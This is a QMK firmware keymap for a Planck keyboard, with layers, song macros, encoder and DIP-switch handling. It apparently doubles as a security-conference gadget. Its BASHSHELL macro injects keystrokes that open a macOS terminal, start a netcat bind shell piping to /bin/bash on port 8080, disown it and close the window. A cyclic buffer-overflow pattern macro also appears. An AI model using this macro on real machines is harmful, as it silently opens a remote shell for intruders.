/* Copyright 2015-2017 Jack Humbert
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include QMK_KEYBOARD_H
#include "muse.h"


extern keymap_config_t keymap_config;


enum planck_layers {
  _QWERTY,
  _LOWER,
  _RAISE,
  _NUMS,
  _ADJUST
};

enum planck_keycodes {
  QWERTY = SAFE_RANGE,
  LOWER,
  RAISE,
  NUMS,
  BACKLIT,
  TWOFIVEFIVE,
  ZELDA,
  ZELDA1,
  MARIO,
  BACKWORD,
  VIPASTE,
  WINPATH,
  COLEQ,
  BASHSHELL,
  HEXX,
  SANS,
  PATTERN
};

float lower_song[][2] = SONG(NUM_LOCK_ON_SOUND);
float raise_song[][2] = SONG(NUM_LOCK_OFF_SOUND);
float zelda_song[][2] = SONG(ZELDA_PUZZLE);
float zelda_song_1[][2] = SONG(ZELDA_TREASURE);
float mario_song[][2] = SONG(ONE_UP_SOUND);

#define LOWER MO(_LOWER)
#define RAISE MO(_RAISE)
#define TABNUMS LT(_NUMS, KC_TAB)
#define SHIFTENT MT(MOD_RSFT, KC_ENT)
#define SPACENUMS LT(_NUMS, KC_SPC)


const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {

/* Qwerty
 * ,-----------------------------------------------------------------------------------.
 * | ESC  |   Q  |   W  |   E  |   R  |   T  |   Y  |   U  |   I  |   O  |   P  | Bksp |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * | T|N  |   A  |   S  |   D  |   F  |   G  |   H  |   J  |   K  |   L  |   ;  |  "   |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * | Shift|   Z  |   X  |   C  |   V  |   B  |   N  |   M  |   ,  |   .  |   /  |SEnter|
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * | CTRL | HYPR | Alt  | GUI  |Lower | Space|SpaceN|Raise | Left | Down |  Up  |Right |
 * `-----------------------------------------------------------------------------------'
 */
[_QWERTY] = LAYOUT_planck_grid(
  KC_ESC,            KC_Q,          KC_W,    KC_E,    KC_R,    KC_T,           KC_Y,    KC_U,    KC_I,           KC_O,           KC_P,          KC_BSPC,
  TABNUMS,           KC_A,          KC_S,    KC_D,    KC_F,    KC_G,           KC_H,    KC_J,    KC_K,           KC_L,           KC_SCLN,       KC_QUOT,
  OSM(MOD_LSFT),     KC_Z,          KC_X,    KC_C,    KC_V,    KC_B,           KC_N,    KC_M,    KC_COMM,        KC_DOT,         KC_SLSH,       SHIFTENT,
  KC_LCTRL,          OSM(MOD_HYPR), KC_LALT, KC_LGUI, LOWER,   SFT_T(KC_SPC),  SPACENUMS,  RAISE, KC_LEFT, KC_DOWN, KC_UP,  CTL_T(KC_RGHT)
),

/* Lower
 * ,-----------------------------------------------------------------------------------.
 * |   ~  |   !  |   @  |   #  |   $  |   %  |   ^  |   &  |   *  |   (  |   )  | Bksp |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      |  vi  |      |   _  |   +  |   {  |   }  |  |   |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      | uname|      |ISO ~ |ISO | |   [  |   ]  |      |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      |             |      |      |      |      | Right|
 * `-----------------------------------------------------------------------------------'
 */
[_LOWER] = LAYOUT_planck_grid(
  KC_TILD, KC_EXLM, KC_AT,   KC_HASH, KC_DLR,  KC_PERC, KC_CIRC, KC_AMPR, KC_ASTR,    KC_LPRN, KC_RPRN, KC_BSPC,
  _______, _______, _______, _______, _______, _______, COLEQ  , KC_UNDS, KC_PLUS,    KC_LCBR, KC_RCBR, KC_PIPE,
  _______, _______, _______, _______, _______, _______, WINPATH, _______, _______,    KC_LBRC, KC_RBRC, _______,
  _______, _______, _______, _______, _______, _______, _______, _______, KC_LEFT,    KC_DOWN, KC_UP,   KC_RGHT
),

/* Raise
 * ,-----------------------------------------------------------------------------------.
 * |   `  |   1  |   2  |   3  |   4  |   5  |   6  |   7  |   8  |   9  |   0  | CTL-W|
 * |------+------+------+------+------+-------------+------+------+------+------+------|
 * | Del  |  F1  |  F2  |  F3  |  F4  |  F5  |  F6  |   -  |   =  |   [  |   ]  |  \   |
 * |------+------+------+------+------+------|------+------+------+------+------+------|
 * |      |  F7  |  F8  |  F9  |  F10 |  F11 |  F12 |ISO # |ISO / | Prev | Next |      |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      |             |      | Next | Vol- | Vol+ | Play |
 * `-----------------------------------------------------------------------------------'
 */
[_RAISE] = LAYOUT_planck_grid(
  KC_GRV,  KC_1,    KC_2,    KC_3,    KC_4,    KC_5,    KC_6,    KC_7,    KC_8,    KC_9,    KC_0, BACKWORD,
  _______, KC_F1,   KC_F2,   KC_F3,   KC_F4,   KC_F5,   KC_F6,   KC_MINS, KC_EQL,  KC_LBRC, KC_RBRC, KC_BSLS,
  _______, KC_F7,   KC_F8,   KC_F9,   KC_F10,  KC_F11,  KC_F12,  KC_NUHS, KC_NUBS, KC_MRWD, KC_MFFD, _______,
  _______, _______, _______, _______, _______, _______, _______, _______, KC_MNXT, KC_VOLD, KC_VOLU, KC_MPLY
),

/* NUMS
 * ,-----------------------------------------------------------------------------------.
 * | Zelda| NUMLK| BASH |      |      |      |  E   |  F   |  7   |  8   |  9   |      |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      |      |  C   |  D   |  4   |  5   |  6   | 255  |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      | HEXX |      |      |      |  A   |  B   |  1   |  2   |  3   |      |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      |             |      |  0   |  :   |  .   |  ENT |
 * `-----------------------------------------------------------------------------------'
 */
[_NUMS] = LAYOUT_planck_grid(
  ZELDA,   KC_NUMLOCK, BASHSHELL,  SANS, _______, _______, KC_E, KC_F, KC_P7, KC_P8, KC_P9,_______,
  _______, PATTERN, _______,   _______, _______, _______, KC_C, KC_D, KC_P4, KC_P5, KC_P6, TWOFIVEFIVE,
  MARIO,   _______, HEXX,   _______, _______, _______, KC_A, KC_B, KC_P1, KC_P2, KC_P3, _______,
  ZELDA1,  _______, _______,   _______, _______, _______, _______, _______, KC_P0, KC_COLN, KC_DOT, KC_ENT
),

/* Adjust (Lower + Raise)
 *                      v------------------------RGB CONTROL--------------------v
 * ,-----------------------------------------------------------------------------------
 * |      | Reset|Debug | RGB  |RGBMOD| HUE+ | HUE- | SAT+ | SAT- |BRGTH+|BRGTH-|  Del |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |Aud on|Audoff|AGnorm|AGswap|Qwerty|      |      |      |      |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |Voice-|Voice+|Mus on|Musoff|MIDIon|MIDIof|      |      |      |      |      |
 * |------+------+------+------+------+------+------+------+------+------+------+------|
 * |      |      |      |      |      |             |      |      |      |      |      |
 * `-----------------------------------------------------------------------------------'
 */
[_ADJUST] = LAYOUT_planck_grid(
    _______, RESET,   DEBUG,   RGB_TOG, RGB_MOD, RGB_HUI, RGB_HUD, RGB_SAI, RGB_SAD,  RGB_VAI, RGB_VAD, KC_DEL ,
    _______, _______, MU_MOD,  AU_ON,   AU_OFF,  AG_NORM, AG_SWAP, QWERTY,  _______,  _______, _______, _______,
    _______, MUV_DE,  MUV_IN,  MU_ON,   MU_OFF,  MI_ON,   MI_OFF,  TERM_ON, TERM_OFF, _______, _______, _______,
    _______, _______, _______, _______, _______, _______, _______, _______, _______,  _______, _______, _______
)

};

#ifdef AUDIO_ENABLE
  float plover_song[][2]     = SONG(PLOVER_SOUND);
  float plover_gb_song[][2]  = SONG(PLOVER_GOODBYE_SOUND);
#endif

layer_state_t layer_state_set_user(layer_state_t state) {
  return update_tri_layer_state(state, _LOWER, _RAISE, _ADJUST);
}

bool process_record_user(uint16_t keycode, keyrecord_t *record) {
  switch (keycode) {
    case BASHSHELL:
      if (record->event.pressed) {
        SEND_STRING(SS_LGUI(" "));
        wait_ms(500);
        SEND_STRING("terminal" SS_TAP(X_ENTER));
        wait_ms(1000);
        SEND_STRING("mkfifo /tmp/bp" SS_TAP(X_ENTER));
        SEND_STRING("nc -nl 8080 </tmp/bp | /bin/bash > /tmp/bp &" SS_TAP(X_ENTER));
        SEND_STRING("disown" SS_TAP(X_ENTER));
        SEND_STRING("exit" SS_TAP(X_ENTER));
        SEND_STRING(SS_LGUI("q"));
      }
      return false;
        case SANS:
          if (record->event.pressed) {
            SEND_STRING(SS_LGUI(" "));
            wait_ms(500);
            SEND_STRING("iterm");
            SEND_STRING(SS_TAP(X_ENTER));
            wait_ms(1000);
            SEND_STRING("st");
            SEND_STRING(SS_TAP(X_ENTER));
            wait_ms(2000);
            SEND_STRING(SS_LGUI("+++++++++++++++++++++++++++++++++"));
            SEND_STRING("Hackfest is awesome!!!");
        }
        return false;
        case PATTERN:
          if (record->event.pressed) {
            /* 1000 Character Pattern */
            SEND_STRING("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B");
        }
        return false;
    return false;
    case HEXX:
      if (record->event.pressed) {
        SEND_STRING("\\x");
      }
      return false;
    case COLEQ:
      if (record->event.pressed) {
        SEND_STRING(":=");
      }
      return false;
    case WINPATH:
      if (record->event.pressed) {
        SEND_STRING(":\\");
      }
      return false;
    case TWOFIVEFIVE:
      if (record->event.pressed) {
        SEND_STRING("255");
      }
      else{      return false;
        break;}
      return false;
      break;
    case ZELDA:
      if (record->event.pressed) {
        PLAY_SONG(zelda_song);
      }
      else{      return false;
        break;}
      return false;
      break;
    case ZELDA1:
      if (record->event.pressed) {
        PLAY_SONG(zelda_song_1);
      }
      else{      return false;
        break;}
      return false;
      break;
    case MARIO:
      if (record->event.pressed) {
        PLAY_SONG(mario_song);
      }
      else{      return false;
        break;}
      return false;
      break;
    case QWERTY:
      if (record->event.pressed) {
        print("mode just switched to qwerty and this is a huge string\n");
        set_single_persistent_default_layer(_QWERTY);
      }
      return false;
      break;
    case BACKLIT:
      if (record->event.pressed) {
        register_code(KC_RSFT);
        #ifdef BACKLIGHT_ENABLE
          backlight_step();
        #endif
        #ifdef KEYBOARD_planck_rev5
          PORTE &= ~(1<<6);
        #endif
      } else {
        unregister_code(KC_RSFT);
        #ifdef KEYBOARD_planck_rev5
          PORTE |= (1<<6);
        #endif
      }
      return false;
      break;
  }
  return true;
}

bool muse_mode = false;
uint8_t last_muse_note = 0;
uint16_t muse_counter = 0;
uint8_t muse_offset = 70;
uint16_t muse_tempo = 50;

void encoder_update(bool clockwise) {
  if (muse_mode) {
    if (IS_LAYER_ON(_RAISE)) {
      if (clockwise) {
        muse_offset++;
      } else {
        muse_offset--;
      }
    } else {
      if (clockwise) {
        muse_tempo+=1;
      } else {
        muse_tempo-=1;
      }
    }
  } else {
    if (clockwise) {
      #ifdef MOUSEKEY_ENABLE
        tap_code(KC_MS_WH_DOWN);
      #else
        tap_code(KC_PGDN);
      #endif
    } else {
      #ifdef MOUSEKEY_ENABLE
        tap_code(KC_MS_WH_UP);
      #else
        tap_code(KC_PGUP);
      #endif
    }
  }
}

void dip_switch_update_user(uint8_t index, bool active) {
  switch (index) {
    case 0:
      if (active) {
        #ifdef AUDIO_ENABLE
          PLAY_SONG(plover_song);
        #endif
        layer_on(_ADJUST);
      } else {
        #ifdef AUDIO_ENABLE
          PLAY_SONG(plover_gb_song);
        #endif
        layer_off(_ADJUST);
      }
      break;
    case 1:
      if (active) {
        muse_mode = true;
      } else {
        muse_mode = false;
        #ifdef AUDIO_ENABLE
          stop_all_notes();
        #endif
      }
   }
}

void matrix_scan_user(void) {
  #ifdef AUDIO_ENABLE
    if (muse_mode) {
      if (muse_counter == 0) {
        uint8_t muse_note = muse_offset + SCALE[muse_clock_pulse()];
        if (muse_note != last_muse_note) {
          stop_note(compute_freq_for_midi_note(last_muse_note));
          play_note(compute_freq_for_midi_note(muse_note), 0xF);
          last_muse_note = muse_note;
        }
      }
      muse_counter = (muse_counter + 1) % muse_tempo;
    }
  #endif
}

bool music_mask_user(uint16_t keycode) {
  switch (keycode) {
    case RAISE:
    case LOWER:
      return false;
    default:
      return true;
  }
}
